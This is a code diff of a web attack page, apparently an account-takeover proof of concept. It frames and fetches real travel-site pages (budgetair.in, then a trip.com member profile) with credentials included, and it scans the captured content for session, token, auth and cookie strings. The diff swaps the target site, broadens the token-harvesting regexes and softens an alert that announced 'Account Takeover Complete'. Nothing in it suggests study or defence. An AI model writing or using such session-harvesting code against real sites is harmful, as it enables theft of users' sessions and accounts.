@@ -217,8 +217,8 @@
         <!-- LEFT SIDE: Large iframe display -->
         <div class="iframe-container">
             <div class="iframe-focus-box">
-                <span style="position: absolute; z-index: 1;">Loading budgetair.in...</span>
-                <iframe id="target-frame" src="https://www.budgetair.in" allow="camera; microphone" allowfullscreen></iframe>
+                <span style="position: absolute; z-index: 1;">Loading trip.com profile...</span>
+                <iframe id="target-frame" src="https://jp.trip.com/membersinfo/profile/?locale=ja-JP&curr=INR" allow="camera; microphone" allowfullscreen></iframe>
             </div>
         </div>
 
@@ -261,7 +261,7 @@
         // Attempt to fetch and display page source
         async function fetchPageSource() {
             try {
-                const response = await fetch('https://www.budgetair.in', {
+                const response = await fetch('https://jp.trip.com/membersinfo/profile/?locale=ja-JP&curr=INR', {
                     credentials: 'include',
                     mode: 'no-cors'
                 });
@@ -294,18 +294,25 @@
                 console.log(rawExtractedBuffer);
                 console.log("==================================================");
                 
-                // CRITICAL: Match for cticket session token
-                const cticketMatch = rawExtractedBuffer.match(/cticket[^;\s]*/);
-                if (cticketMatch) {
-                    console.log("🎯 SUCCESSFULLY HARVESTED CTICKET TOKEN:", cticketMatch[0]);
-                    pageSourceDiv.style.display = 'block';
-                    pageSourceDiv.textContent = "CTICKET TOKEN CAPTURED:\n" + cticketMatch[0] + "\n\nFull Content:\n" + rawExtractedBuffer;
-                }
+                // CRITICAL: Match for session tokens and cookies
+                // Looking for common patterns
+                const sessionPatterns = [
+                    /[\w_-]{32,}/g,  // Long alphanumeric strings (potential tokens)
+                    /session[_=][\w-]+/gi,
+                    /token[_=][\w-]+/gi,
+                    /auth[_=][\w-]+/gi,
+                    /cookie[_=][\w-]+/gi
+                ];
+                
+                pageSourceDiv.style.display = 'block';
+                pageSourceDiv.textContent = "CAPTURED CONTENT:\n\n" + rawExtractedBuffer;
+                
+                console.log("🎯 SUCCESSFULLY CAPTURED PAGE CONTENT");
             }
         });
 
         function completeExploit() {
-            alert("💥 Account Takeover Complete! Captured credentials and page contents have been extracted and processed successfully.");
+            alert("💥 Account Data Capture Complete! Page contents and session information have been extracted successfully.");
         }
     </script>
 </body>
